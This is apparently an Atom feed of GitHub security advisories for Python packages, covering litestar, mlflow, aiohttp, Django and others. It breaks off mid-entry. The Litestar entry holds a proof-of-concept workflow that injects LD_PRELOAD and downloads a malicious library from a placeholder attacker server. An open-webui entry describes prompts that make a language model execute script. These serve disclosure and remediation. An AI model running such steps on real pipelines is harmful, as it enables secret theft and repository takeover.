<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-08-10T16:01:20.263Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[litestar] Litestar has an environment Variable injection in `docs-preview.yml` workflow]]></title>
        <id>https://github.com/advisories/GHSA-4hq2-rpgc-r8r7</id>
        <link href="https://github.com/advisories/GHSA-4hq2-rpgc-r8r7"/>
        <updated>2024-08-09T19:22:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Litestar's <code>docs-preview.yml</code> workflow is vulnerable to Environment Variable injection which may lead to secret exfiltration and repository manipulation.</p>
<h3 id="environment-variable-injection-ghsl-2024-177">Environment Variable injection (<code>GHSL-2024-177</code>)</h3>
<p>The <a href="https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml"><code>docs-preview.yml</code> workflow</a> gets triggered when the <code>Tests And Linting</code> workflow completes:</p>
<pre><code class="language-yaml">on:
  workflow_run:
    workflows: [Tests And Linting]
    types: [completed]
</code></pre>
<p>Later, it downloads and extracts an artifact generated by the triggering workflow:</p>
<pre><code class="language-yaml">- name: Download artifact
uses: dawidd6/action-download-artifact@v6
with:
  workflow_conclusion: success
  run_id: ${{ github.event.workflow_run.id }}
  path: docs-preview
  name: docs-preview
</code></pre>
<p>And reads <code>docs-preview/.pr_number</code> into an Environment Variable:</p>
<pre><code class="language-yaml">- name: Set PR number
  run: echo "PR_NUMBER=$(cat docs-preview/.pr_number)" &gt;&gt; $GITHUB_ENV
</code></pre>
<p>The <code>$GITHUB_ENV</code> pointed file is just a regular file where every <code>KEY=VALUE</code> will be used to define a new Environment Variable after the step completes. Since the contents of the <code>.pr_number</code> file have not been validated, they may contain new lines that will cause new Environment Variables to be defined.</p>
<p>An attacker can send a malicious <code>.pr_number</code> file with the following content:</p>
<pre><code class="language-txt">111
LD_PRELOAD=/home/runner/work/litestar/litestar/inject.so
</code></pre>
<p>Which will result in two Environment Variables being defined:</p>
<ul>
<li>PR_NUMBER=111</li>
<li>LD_PRELOAD=/home/runner/work/litestar/litestar/inject.so</li>
</ul>
<p>In this example we are manipulating the <code>LD_PRELOAD</code> environment variable to force the system to load a malicious shared library called <code>inject.so</code>. As a result, all subsequent processes launched will automatically incorporate this compromised library into their execution environment.</p>
<p>The following step will run the <code>JamesIves/github-pages-deploy-action</code> action which will <a href="https://github.com/JamesIves/github-pages-deploy-action/blob/2c9a889f39c2410b2ca1342f465a53a7c5c389b4/action.yml#L5">run the <code>node</code> command</a>. Therefore the <code>LD_PRELOAD</code> will execute arbitrary code when <code>node</code> gets executed:</p>
<pre><code class="language-yaml">- name: Deploy docs preview
  uses: JamesIves/github-pages-deploy-action@v4
  with:
    folder: docs-preview/docs/_build/html
    token: ${{ secrets.DOCS_PREVIEW_DEPLOY_TOKEN }}
    repository-name: litestar-org/litestar-docs-preview
    clean: false
    target-folder: ${{ env.PR_NUMBER }}
    branch: gh-pages
</code></pre>
<h4 id="poc">PoC</h4>
<ul>
<li>Clone the repository</li>
<li>Edit the <code>ci.yml</code> workflow.</li>
</ul>
<pre><code class="language-yaml">name: Tests And Linting

on:
  pull_request:

jobs:
  upload-patch:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Save PR number and payload
        run: |
          make payload
          echo -e "${{ github.event.number }}\nLD_PRELOAD=/home/runner/work/litestar/litestar/inject.so" &gt; payload/.pr_number
          curl http://&lt;ATTACKER SERVER&gt;/inject.so -o payload/inject.so

      - name: Upload artifact
        uses: actions/upload-artifact@v3
        with:
          name: docs-preview
          path: payload
</code></pre>
<ul>
<li>Create a Pull Request with this change.</li>
<li>Since the modified workflow is triggered on <code>pull_request</code>, the attacker Pull Request will trigger it and upon completion will trigger the vulnerable <code>Deploy documentation preview</code> workflow which will read the malicious artifact and pollute the Environment Variables.</li>
</ul>
<h4 id="impact">Impact</h4>
<p>This issue will grant a malicious actor the <a href="https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17">following permissions</a>:</p>
<pre><code>  Issues: write
  Metadata: read
  PullRequests: write
</code></pre>
<p>In addition, the following secret will get exposed to the attacker: <code>DOCS_PREVIEW_DEPLOY_TOKEN</code></p>
<h4 id="remediation">Remediation</h4>
<ul>
<li>Verify the contents of the downloaded artifacts.</li>
<li>Do not allow new lines in the value redirected to GITHUB_ENV</li>
</ul>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/">CodeQL for JavaScript - Expression injection in Actions</a></li>
<li><a href="https://securitylab.github.com/research/github-actions-untrusted-input/">Keeping your GitHub Actions and workflows secure Part 2: Untrusted input</a></li>
<li><a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests</a></li>
</ul>
<h2 id="disclosure-policy">Disclosure Policy</h2>
<p>This report is subject to a 90-day disclosure deadline, as described in more detail in our <a href="https://securitylab.github.com/advisories#policy">coordinated disclosure policy</a>.</p>
<h2 id="note-on-vulnerability-severity">Note on vulnerability severity</h2>
<p>This global advisory lists the vulnerability at <code>low</code> severity while the repository advisory and CVE record list the vulnerability at <code>high</code> severity because the confidentiality, integrity, and availability impacts of the vulnerability affect Litestar's CI/CD environment rather than the <code>litestar</code> package.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7">https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7</a></li>
<li><a href="https://github.com/litestar-org/litestar/commit/84d351e96aaa2a1338006d6e7221eded161f517b">https://github.com/litestar-org/litestar/commit/84d351e96aaa2a1338006d6e7221eded161f517b</a></li>
<li><a href="https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml">https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-4hq2-rpgc-r8r7">https://github.com/advisories/GHSA-4hq2-rpgc-r8r7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4hq2-rpgc-r8r7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-09T19:22:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] mlflow vulnerable to Path Traversal]]></title>
        <id>https://github.com/advisories/GHSA-j62r-wxqq-f3gf</id>
        <link href="https://github.com/advisories/GHSA-j62r-wxqq-f3gf"/>
        <updated>2024-08-09T18:07:48.000Z</updated>
        <content type="html"><![CDATA[<p>A path traversal vulnerability exists in the <code>_create_model_version()</code> function within <code>server/handlers.py</code> of the mlflow/mlflow repository, due to improper validation of the <code>source</code> parameter. Attackers can exploit this vulnerability by crafting a <code>source</code> parameter that bypasses the <code>_validate_non_local_source_contains_relative_paths(source)</code> function's checks, allowing for arbitrary file read access on the server. The issue arises from the handling of unquoted URL characters and the subsequent misuse of the original <code>source</code> value for model version creation, leading to the exposure of sensitive files when interacting with the <code>/model-versions/get-artifact</code> handler.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1558">https://nvd.nist.gov/vuln/detail/CVE-2024-1558</a></li>
<li><a href="https://huntr.com/bounties/7f4dbcc5-b6b3-43dd-b310-e2d0556a8081">https://huntr.com/bounties/7f4dbcc5-b6b3-43dd-b310-e2d0556a8081</a></li>
<li><a href="https://github.com/advisories/GHSA-j62r-wxqq-f3gf">https://github.com/advisories/GHSA-j62r-wxqq-f3gf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j62r-wxqq-f3gf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-16T00:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] mlflow Path Traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-f82r-jj5r-6g97</id>
        <link href="https://github.com/advisories/GHSA-f82r-jj5r-6g97"/>
        <updated>2024-08-09T18:06:42.000Z</updated>
        <content type="html"><![CDATA[<p>A path traversal vulnerability exists in mlflow/mlflow version 2.9.2, allowing attackers to access arbitrary files on the server. By crafting a series of HTTP POST requests with specially crafted 'artifact_location' and 'source' parameters, using a local URI with '#' instead of '?', an attacker can traverse the server's directory structure. The issue occurs due to insufficient validation of user-supplied input in the server's handlers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1483">https://nvd.nist.gov/vuln/detail/CVE-2024-1483</a></li>
<li><a href="https://huntr.com/bounties/52a3855d-93ff-4460-ac24-9c7e4334198d">https://huntr.com/bounties/52a3855d-93ff-4460-ac24-9c7e4334198d</a></li>
<li><a href="https://github.com/advisories/GHSA-f82r-jj5r-6g97">https://github.com/advisories/GHSA-f82r-jj5r-6g97</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f82r-jj5r-6g97</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-16T00:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aiohttp] In aiohttp, compressed files as symlinks are not protected from path traversal]]></title>
        <id>https://github.com/advisories/GHSA-jwhx-xcg6-8xhj</id>
        <link href="https://github.com/advisories/GHSA-jwhx-xcg6-8xhj"/>
        <updated>2024-08-09T16:49:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Static routes which contain files with compressed variants (<code>.gz</code> or <code>.br</code> extension) were vulnerable to path traversal outside the root directory if those variants are symbolic links.</p>
<h3 id="details">Details</h3>
<p>The server protects static routes from path traversal outside the root directory when <code>follow_symlinks=False</code> (default).  It does this by resolving the requested URL to an absolute path and then checking that path relative to the root.  However, these checks are not performed when looking for compressed variants in the <code>FileResponse</code> class, and symbolic links are then automatically followed when performing <code>Path.stat()</code> and <code>Path.open()</code> to send the file.</p>
<h3 id="impact">Impact</h3>
<p>Servers with static routes that contain compressed variants as symbolic links, pointing outside the root directory, or that permit users to upload or create such links, are impacted.</p>
<hr>
<p>Patch: <a href="https://github.com/aio-libs/aiohttp/pull/8653/files">https://github.com/aio-libs/aiohttp/pull/8653/files</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-jwhx-xcg6-8xhj">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-jwhx-xcg6-8xhj</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/pull/8653">https://github.com/aio-libs/aiohttp/pull/8653</a></li>
<li><a href="https://github.com/aio-libs/aiohttp/commit/ce2e9758814527589b10759a20783fb03b98339f">https://github.com/aio-libs/aiohttp/commit/ce2e9758814527589b10759a20783fb03b98339f</a></li>
<li><a href="https://github.com/advisories/GHSA-jwhx-xcg6-8xhj">https://github.com/advisories/GHSA-jwhx-xcg6-8xhj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jwhx-xcg6-8xhj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-09T16:49:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mlflow] Remote Code Execution due to Full Controled File Write in mlflow]]></title>
        <id>https://github.com/advisories/GHSA-5p3h-7fwh-92rc</id>
        <link href="https://github.com/advisories/GHSA-5p3h-7fwh-92rc"/>
        <updated>2024-08-08T20:05:59.000Z</updated>
        <content type="html"><![CDATA[<p>The mlflow web server includes tools for tracking experiments, packaging code into reproducible runs, and sharing and deploying models. As this vulnerability allows to write / overwrite any file on the file system, it gives a lot of ways to archive code execution (like overwriting <code>/home/&lt;user&gt;/.bashrc</code>). A malicious user could use this issue to get command execution on the vulnerable machine and get access to data &amp; models information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-6018">https://nvd.nist.gov/vuln/detail/CVE-2023-6018</a></li>
<li><a href="https://huntr.com/bounties/7cf918b5-43f4-48c0-a371-4d963ce69b30">https://huntr.com/bounties/7cf918b5-43f4-48c0-a371-4d963ce69b30</a></li>
<li><a href="https://github.com/mlflow/mlflow/commit/55c72d02380e8db8118595a4fdae7879cb7ac5bd">https://github.com/mlflow/mlflow/commit/55c72d02380e8db8118595a4fdae7879cb7ac5bd</a></li>
<li><a href="https://github.com/advisories/GHSA-5p3h-7fwh-92rc">https://github.com/advisories/GHSA-5p3h-7fwh-92rc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5p3h-7fwh-92rc</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-11-16T18:30:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI Stored Cross-Site Scripting Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5jp3-wp5v-5363</id>
        <link href="https://github.com/advisories/GHSA-5jp3-wp5v-5363"/>
        <updated>2024-08-08T16:30:18.000Z</updated>
        <content type="html"><![CDATA[<p>Attackers can craft a malicious prompt that coerces the language model into executing arbitrary JavaScript in the context of the web page.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6706">https://nvd.nist.gov/vuln/detail/CVE-2024-6706</a></li>
<li><a href="https://korelogic.com/Resources/Advisories/KL-001-2024-005.txt">https://korelogic.com/Resources/Advisories/KL-001-2024-005.txt</a></li>
<li><a href="https://github.com/advisories/GHSA-5jp3-wp5v-5363">https://github.com/advisories/GHSA-5jp3-wp5v-5363</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5jp3-wp5v-5363</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-08T00:31:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyterhub] JupyterHub has a privilege escalation vulnerability with the `admin:users` scope]]></title>
        <id>https://github.com/advisories/GHSA-9x4q-3gxw-849f</id>
        <link href="https://github.com/advisories/GHSA-9x4q-3gxw-849f"/>
        <updated>2024-08-08T16:59:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If a user is granted the <code>admin:users</code> scope, they may escalate their own privileges by making themselves a full admin user.</p>
<h3 id="details">Details</h3>
<p>The <code>admin:users</code> scope allows a user to edit user records:</p>
<blockquote>
<p>admin:users</p>
<p>Read, write, create and delete users and their authentication state, not including their servers or tokens.</p>
<p>-- <a href="https://jupyterhub.readthedocs.io/en/stable/rbac/scopes.html#available-scopes">https://jupyterhub.readthedocs.io/en/stable/rbac/scopes.html#available-scopes</a></p>
</blockquote>
<p>However, this includes making users admins. Admin users are granted scopes beyond <code>admin:users</code> making this a mechanism by which granted scopes may be escalated.</p>
<h3 id="impact">Impact</h3>
<p>The impact is relatively small in that <code>admin:users</code> is already an extremely privileged scope only granted to trusted users.
In effect, <code>admin:users</code> is equivalent to <code>admin=True</code>, which is not intended.</p>
<p>Note that the change here only prevents escalation to the built-in JupyterHub admin role that has unrestricted permissions. It does not prevent users with e.g. <code>groups</code> permissions from granting themselves or other users permissions via group membership, which is intentional.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterhub/jupyterhub/security/advisories/GHSA-9x4q-3gxw-849f">https://github.com/jupyterhub/jupyterhub/security/advisories/GHSA-9x4q-3gxw-849f</a></li>
<li><a href="https://github.com/jupyterhub/jupyterhub/commit/99e2720b0fc626cbeeca3c6337f917fdacfaa428">https://github.com/jupyterhub/jupyterhub/commit/99e2720b0fc626cbeeca3c6337f917fdacfaa428</a></li>
<li><a href="https://github.com/jupyterhub/jupyterhub/commit/ff2db557a85b6980f90c3158634bf924063ab8ba">https://github.com/jupyterhub/jupyterhub/commit/ff2db557a85b6980f90c3158634bf924063ab8ba</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41942">https://nvd.nist.gov/vuln/detail/CVE-2024-41942</a></li>
<li><a href="https://github.com/advisories/GHSA-9x4q-3gxw-849f">https://github.com/advisories/GHSA-9x4q-3gxw-849f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9x4q-3gxw-849f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-08T14:37:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyterhub] JupyterHub has a privilege escalation vulnerability with the `admin:users` scope]]></title>
        <id>https://github.com/advisories/GHSA-9x4q-3gxw-849f</id>
        <link href="https://github.com/advisories/GHSA-9x4q-3gxw-849f"/>
        <updated>2024-08-08T16:59:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If a user is granted the <code>admin:users</code> scope, they may escalate their own privileges by making themselves a full admin user.</p>
<h3 id="details">Details</h3>
<p>The <code>admin:users</code> scope allows a user to edit user records:</p>
<blockquote>
<p>admin:users</p>
<p>Read, write, create and delete users and their authentication state, not including their servers or tokens.</p>
<p>-- <a href="https://jupyterhub.readthedocs.io/en/stable/rbac/scopes.html#available-scopes">https://jupyterhub.readthedocs.io/en/stable/rbac/scopes.html#available-scopes</a></p>
</blockquote>
<p>However, this includes making users admins. Admin users are granted scopes beyond <code>admin:users</code> making this a mechanism by which granted scopes may be escalated.</p>
<h3 id="impact">Impact</h3>
<p>The impact is relatively small in that <code>admin:users</code> is already an extremely privileged scope only granted to trusted users.
In effect, <code>admin:users</code> is equivalent to <code>admin=True</code>, which is not intended.</p>
<p>Note that the change here only prevents escalation to the built-in JupyterHub admin role that has unrestricted permissions. It does not prevent users with e.g. <code>groups</code> permissions from granting themselves or other users permissions via group membership, which is intentional.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyterhub/jupyterhub/security/advisories/GHSA-9x4q-3gxw-849f">https://github.com/jupyterhub/jupyterhub/security/advisories/GHSA-9x4q-3gxw-849f</a></li>
<li><a href="https://github.com/jupyterhub/jupyterhub/commit/99e2720b0fc626cbeeca3c6337f917fdacfaa428">https://github.com/jupyterhub/jupyterhub/commit/99e2720b0fc626cbeeca3c6337f917fdacfaa428</a></li>
<li><a href="https://github.com/jupyterhub/jupyterhub/commit/ff2db557a85b6980f90c3158634bf924063ab8ba">https://github.com/jupyterhub/jupyterhub/commit/ff2db557a85b6980f90c3158634bf924063ab8ba</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41942">https://nvd.nist.gov/vuln/detail/CVE-2024-41942</a></li>
<li><a href="https://github.com/advisories/GHSA-9x4q-3gxw-849f">https://github.com/advisories/GHSA-9x4q-3gxw-849f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9x4q-3gxw-849f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-08T14:37:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[aim] Aim denial of service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-36h2-g4c8-9xcm</id>
        <link href="https://github.com/advisories/GHSA-36h2-g4c8-9xcm"/>
        <updated>2024-08-07T20:38:43.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability in aimhubio/aim version 3.19.3 allows an attacker to cause a denial of service by configuring the remote tracking server to point at itself. This results in the server endlessly connecting to itself, rendering it unable to respond to other connections.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6227">https://nvd.nist.gov/vuln/detail/CVE-2024-6227</a></li>
<li><a href="https://huntr.com/bounties/abcea7c6-bb3b-45e9-aa15-9eb6b224451a">https://huntr.com/bounties/abcea7c6-bb3b-45e9-aa15-9eb6b224451a</a></li>
<li><a href="https://github.com/aimhubio/aim/blob/2e7b8aff8dcba9ddd5043dfec88cf2319ba8a87c/aim/sdk/repo.py#L195">https://github.com/aimhubio/aim/blob/2e7b8aff8dcba9ddd5043dfec88cf2319ba8a87c/aim/sdk/repo.py#L195</a></li>
<li><a href="https://github.com/advisories/GHSA-36h2-g4c8-9xcm">https://github.com/advisories/GHSA-36h2-g4c8-9xcm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-36h2-g4c8-9xcm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-08T21:31:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pulpcore] Pulp incorrectly assigns RBAC permissions in tasks that create objects]]></title>
        <id>https://github.com/advisories/GHSA-9m5j-4xx9-44j9</id>
        <link href="https://github.com/advisories/GHSA-9m5j-4xx9-44j9"/>
        <updated>2024-08-07T19:45:32.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in the Pulp package. When a role-based access control (RBAC) object in Pulp is set to assign permissions on its creation, it uses the <code>AutoAddObjPermsMixin</code> (typically the add_roles_for_object_creator method). This method finds the object creator by checking the current authenticated user. For objects that are created within a task, this current user is set by the first user with any permissions on the task object. This means the oldest user with model/domain-level task permissions will always be set as the current user of a task, even if they didn't dispatch the task. Therefore, all objects created in tasks will have their permissions assigned to this oldest user, and the creating user will receive nothing.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7143">https://nvd.nist.gov/vuln/detail/CVE-2024-7143</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-7143">https://access.redhat.com/security/cve/CVE-2024-7143</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2300125">https://bugzilla.redhat.com/show_bug.cgi?id=2300125</a></li>
<li><a href="https://github.com/pulp/pulpcore/blob/93f241f34c503da0fbac94bdba739feda2636e12/pulpcore/tasking/_util.py#L108">https://github.com/pulp/pulpcore/blob/93f241f34c503da0fbac94bdba739feda2636e12/pulpcore/tasking/_util.py#L108</a></li>
<li><a href="https://github.com/advisories/GHSA-9m5j-4xx9-44j9">https://github.com/advisories/GHSA-9m5j-4xx9-44j9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9m5j-4xx9-44j9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-07T18:30:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django vulnerable to denial-of-service attack]]></title>
        <id>https://github.com/advisories/GHSA-r836-hh6v-rg5g</id>
        <link href="https://github.com/advisories/GHSA-r836-hh6v-rg5g"/>
        <updated>2024-08-08T15:01:00.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The urlize and urlizetrunc template filters, and the AdminURLFieldWidget widget, are subject to a potential denial-of-service attack via certain inputs with a very large number of Unicode characters.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41991">https://nvd.nist.gov/vuln/detail/CVE-2024-41991</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://groups.google.com/forum/#%21forum/django-announce">https://groups.google.com/forum/#%21forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/aug/06/security-releases">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>
<li><a href="https://github.com/django/django/commit/523da8771bce321023f490f70d71a9e973ddc927">https://github.com/django/django/commit/523da8771bce321023f490f70d71a9e973ddc927</a></li>
<li><a href="https://github.com/django/django/commit/efea1ef7e2190e3f77ca0651b5458297bc0f6a9f">https://github.com/django/django/commit/efea1ef7e2190e3f77ca0651b5458297bc0f6a9f</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-69.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-69.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-r836-hh6v-rg5g">https://github.com/advisories/GHSA-r836-hh6v-rg5g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r836-hh6v-rg5g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-07T15:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django vulnerable to denial-of-service attack]]></title>
        <id>https://github.com/advisories/GHSA-r836-hh6v-rg5g</id>
        <link href="https://github.com/advisories/GHSA-r836-hh6v-rg5g"/>
        <updated>2024-08-08T15:01:00.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The urlize and urlizetrunc template filters, and the AdminURLFieldWidget widget, are subject to a potential denial-of-service attack via certain inputs with a very large number of Unicode characters.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41991">https://nvd.nist.gov/vuln/detail/CVE-2024-41991</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://groups.google.com/forum/#%21forum/django-announce">https://groups.google.com/forum/#%21forum/django-announce</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/aug/06/security-releases">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>
<li><a href="https://github.com/django/django/commit/523da8771bce321023f490f70d71a9e973ddc927">https://github.com/django/django/commit/523da8771bce321023f490f70d71a9e973ddc927</a></li>
<li><a href="https://github.com/django/django/commit/efea1ef7e2190e3f77ca0651b5458297bc0f6a9f">https://github.com/django/django/commit/efea1ef7e2190e3f77ca0651b5458297bc0f6a9f</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-69.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-69.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-r836-hh6v-rg5g">https://github.com/advisories/GHSA-r836-hh6v-rg5g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r836-hh6v-rg5g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-07T15:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django SQL injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-pv4p-cwwg-4rph</id>
        <link href="https://github.com/advisories/GHSA-pv4p-cwwg-4rph"/>
        <updated>2024-08-07T19:02:44.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. QuerySet.values() and values_list() methods on models with a JSONField are subject to SQL injection in column aliases via a crafted JSON object key as a passed *arg.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42005">https://nvd.nist.gov/vuln/detail/CVE-2024-42005</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/aug/06/security-releases">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>
<li><a href="https://github.com/django/django/commit/32ebcbf2e1fe3e5ba79a6554a167efce81f7422d">https://github.com/django/django/commit/32ebcbf2e1fe3e5ba79a6554a167efce81f7422d</a></li>
<li><a href="https://github.com/django/django/commit/f4af67b9b41e0f4c117a8741da3abbd1c869ab28">https://github.com/django/django/commit/f4af67b9b41e0f4c117a8741da3abbd1c869ab28</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-70.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-70.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-pv4p-cwwg-4rph">https://github.com/advisories/GHSA-pv4p-cwwg-4rph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pv4p-cwwg-4rph</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-08-07T15:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django SQL injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-pv4p-cwwg-4rph</id>
        <link href="https://github.com/advisories/GHSA-pv4p-cwwg-4rph"/>
        <updated>2024-08-07T19:02:44.000Z</updated>
